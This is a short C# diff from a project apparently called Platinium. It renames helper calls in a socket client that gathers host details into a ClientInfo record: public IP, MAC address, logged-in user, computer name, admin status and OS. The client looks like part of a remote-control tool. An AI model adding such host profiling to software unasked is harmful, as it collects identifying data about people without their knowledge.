@@ -80,7 +80,7 @@ namespace Platinium
                         package = NetworkManagement.ReadData(clientSocket);
                     }
                     catch (Exception) { isConnected = false; break; }
-                    Console.WriteLine(package.Content.EmptyIfNull());
+                    Console.WriteLine(package.Content.NULLIfNull());
                     Console.WriteLine(package.PackageType.ToString());
                     if (!DataStructure.PackageStatus.ContainsKey(package.ID))
                     {
@@ -96,16 +96,16 @@ namespace Platinium
             {
                 ClientInfo ci = new ClientInfo
                 {
-                    IP = CFunctions.GetPublicIP(),
-                    MACAddress = CFunctions.GetMacAddress(),
-                    UserName = CFunctions.GetCurrentLoggedUser(),
-                    ComputerName = CFunctions.GetComputerName(),
+                    IP = DeviceInfo.GetPublicIP(),
+                    MACAddress = DeviceInfo.GetMacAddress(),
+                    UserName = DeviceInfo.GetCurrentLoggedUser(),
+                    ComputerName = DeviceInfo.GetComputerName(),
                     UID = FingerPrint.Value(),
                     Type = BaseInfoType.Client,
-                    IsAdministrator = CFunctions.IsAdministrator(),
-                    Language = CFunctions.GetCurrentCulture(),
-                    AppNetVersion = CFunctions.GetAppNetVersion(),
-                    OSName = CFunctions.GetOSName()
+                    IsAdministrator = DeviceInfo.IsAdministrator(),
+                    Language = DeviceInfo.GetCurrentCulture(),
+                    AppNetVersion = DeviceInfo.GetAppNetVersion(),
+                    OSName = DeviceInfo.GetOSName()
                 };
                 return ci;
             }
